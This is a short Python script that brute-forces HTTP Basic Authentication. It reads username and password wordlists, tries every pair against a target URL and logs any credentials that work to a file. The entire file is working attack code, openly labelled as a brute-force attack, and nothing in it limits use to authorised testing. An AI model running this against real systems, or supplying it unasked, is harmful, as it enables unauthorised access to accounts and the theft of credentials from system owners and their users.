import requests
from requests.auth import HTTPBasicAuth

def basic_auth_brute_force(url, username_list, password_list, output_file=None):
    """
    Tries every combination of username and password against a Basic Auth endpoint.
    """
    for username in username_list:
        for password in password_list:
            print(f"Trying: {username}:{password}")
            try:
                # Send request with Basic Auth headers
                response = requests.get(url, auth=HTTPBasicAuth(username, password), timeout=5)
                
                # 200 OK means login succeeded
                if response.status_code == 200:
                    success_msg = f"Success! Credentials found: {username} / {password}"
                    print(f"\n[+] {success_msg}")
                    
                    if output_file:
                        with open(output_file, 'a') as f:
                            f.write(f"\n--- Brute Force Success on {url} ---\n")
                            f.write(f"{success_msg}\n")
                            f.write("------------------------------------\n")
                    return True # Stop after finding one valid login
            except requests.exceptions.RequestException:
                pass 
    
    print("\n[-] No valid credentials found.")
    return False

def main_brute_force_function(target_url, username_file, password_file, output_file=None):
    """
    Loads wordlists and initiates the brute-force attack.
    """
    try:
        with open(username_file, 'r') as file:
            usernames = [line.strip() for line in file if line.strip()]
        with open(password_file, 'r') as file:
            passwords = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print("Error: Wordlist files not found.")
        return

    print(f"\n[*] Starting brute-force attack on: {target_url}")
    basic_auth_brute_force(target_url, usernames, passwords, output_file)
